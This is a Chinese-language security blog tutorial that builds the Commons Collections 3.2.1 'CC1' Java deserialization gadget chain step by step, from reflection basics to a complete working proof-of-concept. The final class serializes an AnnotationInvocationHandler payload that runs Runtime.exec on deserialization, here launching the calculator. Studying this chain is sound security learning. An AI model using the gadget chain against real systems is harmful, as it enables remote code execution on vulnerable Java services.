---
title: "CC重启之从零代码构造TransformedMap CC1"
onlyTitle: true
date: 2024-7-10 00:05:36
categories:
- java
- CC
tags:
- CC
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B886.png
---



在此快速重温一遍Java反序列化知识

## 反射

>* Constructor类型存储getConstructor获取的有参或无参构造函数。其中getConstructor参数为需要获取的构造函数形参类型，如String.class，Class[].class
>
>* newInstance实例化对象，可从原型实例化对象，如person.getClass().newInstance()
>
> 当然这种实例化只能调用无参构造函数实例化。可以先获取构造器，再调用有参构造函数实例化，如：
>
> ```java
>Class c = person.getClass();
>Constructor personconstructor = c.getConstructor(String.Class,int.class);
>Person p = (Person) personconstructor.newInstance("abc",21);
> ```
>
>* Field存储类里的属性。如
>
>```java
>Field[] personfields = c.getDeclaredFields();
>for(Field f:personfields){
>   ...
>}
>```
>
>* Method存储获取的类方法。getMethod()获取类方法
>* invoke执行获取的method方法
>
>
>
>以上方法加declared获取私有内容，如getDecalredFields()获取私有属性
>
>使用setAccessible(true)允许修改私有变量，私有方法等private内容

以上内容不着急理解，接着往下看

反序列化需要从能invoke执行代码的部分走到readObject，序列化时导致任意代码执行。

比如Runtime类下的exec方法就能执行系统命令，我们通常使用单形参的这个exec：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705214001199.png)

>以防有人基础不牢，比如我。此处为java的一些易漏前置知识。
>
>java以是否有static关键字区分了实例方法和静态方法。
>
>* 实例方法：必须通过已经实例化的对象来调用。例如，如果你有一个名为MyClass的类，并且它有一个实例方法doSomething()，你需要先创建MyClass的一个实例，然后通过这个实例来调用方法，如`MyClass instance = new MyClass(); instance.doSomething();`。
>* 静态方法（可以直接调用的方法）：可以通过类名直接调用，无需创建类的实例。例如，如果MyClass有一个静态方法staticMethod()，你可以直接通过类名调用它，如MyClass.staticMethod();
>
>

Runtime.exec()就是实例方法，需要在实例化对象上进行调用。Runtime.getRuntime()返回一个单例实例。

>因为Runtime类没有公开的构造方法，getRuntime()方法实际上是返回了该类的一个单例实例。这样做可以确保整个应用程序中只有一个Runtime实例存在，这样可以更好地管理资源和环境交互
>
>![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705220412807.png)

所以使用`Runtime.getRuntime().exec("calc");`就能调用系统计算器。

但是Runtime类没有继承Serializable，所以不能序列化。InvokerTransformer继承了Serializable，且其transformer调用了invoke，有invoke当然就能用invoke反射调用到Runtime中的exec。反射知识：https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705215406266.png)

先把`Runtime.getRuntime.exec("calc");`改为反射调用：

其中invoke调用格式为：`方法.invoke(对象,参数)`

getMethod调用格式为：`对象.getMethod(方法名,该方法参数类型)`

```java
Runtime r = Runtime.getRuntime();
Class<?> c = Runtime.class;
Method m = c.getMethod("exec", String.class);
m.invoke(r,"calc");
```

getRuntime()是不是也能顺便改成反射了呢？

```java
//代码1
Class<Runtime> c = Runtime.class;
Method gMethod = c.getMethod("getRuntime",null);//getRuntime无参，即null
Object r = gMethod.invoke(null,null);//执行getRuntime，静态方法无需实例，第一个参数为null；
Method execMethod = c.getMethod("exec", String.class);//exec参数类型为string
execMethod.invoke(r,"calc");
```



## CC1

pom dependency：

```xml
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
```

报maven插件版本错误的：

```xml
    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-site-plugin</artifactId>
                <version>3.12.1</version>
            </plugin>
        </plugins>
    </build>
```

去找个jdk源码版或者OpenJDK找对应jdk版本的sun包复制对应目录才能正常调试。

偷懒链接：https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip

### 改造Runtime为可序列化

CC1用InvokerTransformer.transform代为执行invoke，且满足了继承Serializable序列化可传输的功能。

`Class<?> c = Runtime.class;`是可以序列化的。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709162849477.png)

根据上面的代码1，可以很轻松地用InvokerTransformer的构造方法传入反射执行的参数。从而替代代码1

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705220821452.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705223655683.png)

仔细阅读transform的代码，InvokerTransformer传入的第一个参数为getMethod调用的方法名，第二个参数为该方法所需的形参类型，第三个参数为该方法执行时传入的形参。而transform接收的参数为实例对象。

1. `Method gMethod = c.getMethod("getRuntime",null);`可替换为：

```java
        InvokerTransformer getMethod = new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null});
        Method gMethod = (Method) getMethod.transform(Runtime.class);
```

因为getMethod接收的形参类型如下：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708150513048.png)

String对应String.class   Class<?>对应Class[].class

进一步可简化为：

```java
    Method gMethod = (Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
```

2. 同理，`Object r = gMethod.invoke(null,null);`可以改写为：

```java
Object r = new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(gMethod);
```

3. `Method execMethod = c.getMethod("exec", String.class);`可改写为：

```java
Method execMethod =(Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"exec",new Class[]{String.class}}).transform(Runtime.class);
```

4. `execMethod.invoke(r,"calc");`可改写为：

```java
new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{r,new Object[]{"calc"}}).transform(execMethod);
```

依旧能达到效果

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708155629476.png)



如果在第三句，使用Runtime类型存储invoke结果，即Runtime.getRuntime()实例，则能在此实例上直接调用exec：（并不是这里就能序列化了，因为还是Runtime存储的，后续转成InvokerTransformer才能序列化）

>没有继承serializable的一些类依然有办法在反序列化过程中获取实例，实际上整个序列化过程都没有用到Runtime的实例，创建实例的过程发生在反序列化途中。但这种方式要求`构造函数`或者`获取实例的方法`能传进需要的参数，因为我们只有InvokerTransformer的过程是反射调用任意方法，而链式的过程中无法再去反射修改实例的字段（要满足链式，上一个transform()结果作为下一个参数）。

```java
        Class<Runtime> c = Runtime.class;
        Method gMethod = c.getMethod("getRuntime",null);//getRuntime无参，即null
        Runtime r = (Runtime) gMethod.invoke(null,null);//执行getRuntime，静态方法无需实例，第一个参数为null；
        r.exec("calc");
```

则该代码修改为InvokeTransformer版只需三句，且为链式（上一个结果传入下一个形参）

```java
//代码2
		Method gMethod =(Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
        Runtime r = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(gMethod);
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(Runtime.class);
```

现在就能序列化了，首先因为InvokerTransformer继承了Serializable，其次在类里调用的方法实际上还是invoke。到这里就成功一半了

但是这样连续写三遍会不会很麻烦？ChainedTransformer接收一个transformer数组，且ChainedTransformer.transform()会对该数组进行链式调用。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708162342590.png)

InvokerTransformer实现了Transformer接口，new的实例可以赋值给父类或接口，即改写如下：

```java
//代码3
		Transformer[] transformers = new Transformer[]{
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(Runtime.class);
```



### TransformedMap.checkValue()触发transformer

执行命令的部分写好了，现在倒回去找触发到readObject的部分，无论是否经过ChainedTransformer，都是调用transform()方法。查看其用法：

使用到该方法的类很多，比如以下三个：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708164815135.png)

这里的LazyMap和TransformedMap都存在反序列化链。先来看TransformedMap#checkSetValue()

调用了valueTransformer的transform方法。使valueTransformer为指定的ChainedTransformer即可

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708164927727.png)

注意到该类存在一个静态方法decorate()，可以绑定valueTransformer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708204933735.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708225702298.png)

> protected构造方法大概率会被函数内其他public方法调用

那在哪调用了checkSetValue()呢？答案就在TransformedMap的父类中

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709145957991.png)

在AbstractInputCheckedMapDecorator的静态内部类MapEntry的setValue方法中调用了checkSetValue()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709142636991.png)

该静态内部类继承了AbstractMapEntryDecorator，在使用entrySet()遍历entry时能调用该setValue()

>Entry从理解上来看，指map内的一对键值对，如map<"key","value">
>
>protected方法也能在该类嵌套外的类直接使用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709142836958.png)

现在理一遍逻辑，把上文构造的chainedTransformer用decorate()写入this.valueTransformer。这里需要一个map作为第一个参数，新建一个HashMap传入，随便put进一个Entry，这样才能进入遍历。（一个都没有当然不能遍历，也不能setValue）

checkSetValue的参数在调用setValue时传入

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150244470.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150339376.png)

```java
HashMap<Object,Object> map = new HashMap<>();
map.put("key","aaa");
Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
for(Map.Entry entry:transformedMap.entrySet()){
	entry.setValue(Runtime.class);
}
```

### 为什么遍历能使用setValue()？

为什么该抽象类的MapEntry内的方法为什么能在遍历map.entrySet()时使用？下文可以略过，想要深入理解需要把AbstractInputCheckedMapDecorator从上到下分析。

>首先看entrySet()函数，调用该函数会返回一个Set集合，且if默认为真，调用EntrySet静态内部类对原始的map.entrySet()进行装配（静态内部类能在外部类直接实例化）
>
>![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150638066.png)
>
>this关键字指的是当前实例（或对象）。当代码中使用this时，它代表的是调用这个方法的具体实例。在这个特定的上下文中，意味着EntrySet构造函数接收当前实例作为一个参数，这样新创建的EntrySet对象可以访问和利用当前实例的属性和方法，比如isSetValueChecking()方法。
>
>map.entrySet()返回由Map.Entry组成的原始集合
>
>![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150811929.png)
>
>在EntrySet类中，迭代器使用了EntrySetInterator进行迭代
>
>![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709154643257.png)
>
>重写了迭代中会使用的next()，在这里就返回了MapEntry装饰的Map.Entry
>
>![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709154900823.png)
>
>自然调用setValue()是使用MapEntry的setValue()，而不是使用下列红框的原始setValue()
>
>![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709160029659.png)
>
>这里可能会有疑问了，为什么for循环就使用迭代器了呢？
>
>没错，这里用到的增强型for循环（也叫foreach循环）实际上是通过迭代器实现的。尽管代码中没有显式使用迭代器。增强for循环工作原理如下：
>
>>**获取迭代器**：调用集合对象的 `iterator()` 方法，获取一个 `Iterator` 对象。
>
>>**检查是否有下一个元素**：调用 `Iterator` 对象的 `hasNext()` 方法，检查是否有下一个元素。
>
>>**获取下一个元素**：如果 `hasNext()` 返回 `true`，则调用 `Iterator` 对象的 `next()` 方法，获取下一个元素。
>
>>**执行循环体**：将获取的元素赋值给循环变量，并执行循环体。
>
>这意味着每次循环实际上是在使用迭代器遍历集合。
>
>即遍历调用setValue背后的详细步骤如下：
>
>1. **获取迭代器**：增强型 `for` 循环隐式调用 `transformedMap.entrySet().iterator()`，获取 `Iterator` 对象。
>2. **检查是否有下一个元素**：增强型 `for` 循环隐式调用 `Iterator` 对象的 `hasNext()` 方法。
>3. **获取下一个元素**：如果 `hasNext()` 返回 `true`，增强型 `for` 循环隐式调用 `Iterator` 对象的 `next()` 方法。
>4. **执行循环体**：将 `next()` 方法返回的元素赋值给 `entry` 变量，然后执行循环体中的 `entry.setValue(Runtime.class)`。
>
>在 `TransformedMap` 的实现中，这个过程会涉及到以下类和方法：
>
>- 其父类的`EntrySet` 类的 `iterator()` 方法返回一个 `EntrySetIterator` 对象。
>- `EntrySetIterator` 类的 `next()` 方法返回一个 `MapEntry` 对象。
>- `MapEntry` 类的 `setValue()` 方法调用 `TransformedMap` 的 `checkSetValue()` 方法来检查或转换值，然后调用原始 `Map.Entry` 的 `setValue()` 方法。
>
>所以`for(Map.Entry entry:transformedMap.entrySet()){entry.setValue(Runtime.class);}`换成经典的迭代器你就会很容易理解了
>
>```java
>//代码4
>HashMap<Object,Object> map = new HashMap<>();
>map.put("key",null);
>Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
>Iterator it = transformedMap.entrySet().iterator();
>while(it.hasNext()){
>  Map.Entry entry = (Map.Entry<Object,Object>) it.next();
>  entry.setValue(Runtime.class);
>}
>```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709162016938.png)



### 寻找readObject

牢记，最后是readObject触发反序列化。刚好在AnnotationInvocationHandler的readObject里找到了调用setValue的部分，虽然其参数不可控。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709170205275.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709170357665.png)

进入到setValue中，需要把memberValues设置为transformedMap，该属性在其私有构造函数中进行赋值

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709171213495.png)

私有构造函数使用反射获取，修改访问权限即可。该构造函数第一个参数要求继承了Annotation接口，实际上就是要求传入注解类型，比如常用的注解Override，Target

> 可以继承接口或者实现接口。
>
> * 继承接口extends指的是接口之间的关系，其中一个接口扩展另一个接口，从而获得其方法和常量。
> * 实现接口implements指的是类与接口之间的关系，其中类提供了接口中定义的所有抽象方法的具体实现。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709171748034.png)

```java
        Constructor AnnotationInvocationHandlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandlerConstructor.setAccessible(true);
        AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);
```



### 满足if条件

现在构造的主代码如下：

```java
        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("key",null);
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        Constructor AnnotationInvocationHandlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandlerConstructor.setAccessible(true);
        AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);
```

需要满足这两个if判断才能进到setValue，这里的name是通过getKey()取的“键”，即`map.put("key",null)`的"key"

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709173152920.png)

#### 满足if (memberType != null)

在上文的annotationType是调用getInstance()函数，获取给定注解类的AnnotationType实例，内部使用了CAS操作，具体很复杂，不在此深入了解。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709222252382.png)

但在getInstance内部有一句，调用了其私有构造函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223750355.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223816042.png)

构造函数把该注解类内部的所有方法名 put进了memberTypes

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240711170419681.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223850683.png)

在调用annotation.memberTypes时，就返回了这个(name,invocationhandlerReturnType(type))的Map，

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709221815962.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223944354.png)

总结一下，AnnotationInvocationHandler的readObject内的`Class<?> memberType = memberTypes.get(name);`做了什么呢？就是取出注解类中为name的方法名。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709224154670.png)

比如Target注解内有value方法，如果name值为value，是不是memberType就是value？紧随其后的if判断就为真，因为get到了其值。如果name为其他字符串，就get不到值，自然if判断为假，进不了内部

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709224402111.png)



### 满足第二个if

isInstance是一个native（C或C++实现的本地代码，不能看到代码内容）方法，作用是判断指定的对象是否是该类或其子类的实例，我们put进的value为null，当然不是。第二个判断是value值是否为异常代理类的实例（isInstance和instanceof的作用一样）

即第二个填null之外的大部分字符串都能符合要求



### 改变setValue参数值

这里的setValue是他赋予的值，我们要求传入的setValue参数值需要为Runtime.class，见上文代码4

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709225420898.png)

回想一下，我们是在哪需要这个Runtime.class？是在代码2中的

```java
Method gMethod =(Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
```

只是在后面构造时一步一步用不同的函数传参，先是chainedTransformer，又是setValue

既然是在最开始的InvokerTransformer.transform中使用，刚好有一个Transformer，叫ConstantTransformer。构造函数传入常量，然后其transformer返回该常量。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709231907392.png)

那在ChainedTransformer调用最开始加一个实例化ConstantTransformer，传入Runtime.class不就完了？即：

```java
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };
```

这样就根本不用管setValue传什么了。



完整代码如下：

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws Exception {


        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "godown");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
        Constructor<?> AnnotationInvocationHandlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        AnnotationInvocationHandlerConstructor.setAccessible(true);
        Object annotationInvocationHandler = AnnotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);
        serialize(annotationInvocationHandler);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));
        oos.writeObject(obj);
        System.out.println("serialize");
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get(Filename)));
        Object obj = ois.readObject();
        System.out.println("unserialize");
        return obj;
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709235653625.png)

### 调式复测

在反序列化出打上断点，一路步进就能看到完整过程。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240710110144246.png)



调用链完整如下：

```xml
* ObjectInputStream.readObject()
*           AnnotationInvocationHandler.readObject()
*                 MapEntry.setValue()
*                    TransformedMap.checkSetValue()
*                       ChainedTransformer.transform()
```



另外，我们在上文可以看到，LazyMap.get()也调用了transform方法，下一篇讲用LazyMap构造CC反序列化链

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708164815135.png)
